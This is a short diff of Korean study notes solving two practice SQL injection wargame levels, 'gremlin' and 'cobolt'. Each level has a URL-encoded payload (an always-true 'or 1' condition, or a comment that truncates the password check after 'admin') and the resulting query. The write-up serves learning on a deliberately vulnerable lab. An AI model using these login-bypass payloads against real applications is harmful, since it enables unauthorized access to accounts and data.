@@ -1,1 +1,10 @@
+gremlin 문제
+<풀이 과정>
+php?pw=%27%20or%201%23 (select id from prob_gremlin where id='' and pw='' or 1#')
+php?pw=%27or%271=1 (select id from prob_gremlin where id='' and pw=''or'1=1')
+1 = 1로 항상 true를 만들어 해결
 
+cobolt 문제
+<풀이 과정>
+php?id=admin%27%23 (select id from prob_cobolt where id='admin'#' and pw=md5(''))
+id를 admin으로 하고 admin뒤의 문장을 주석으로 만들어 해결
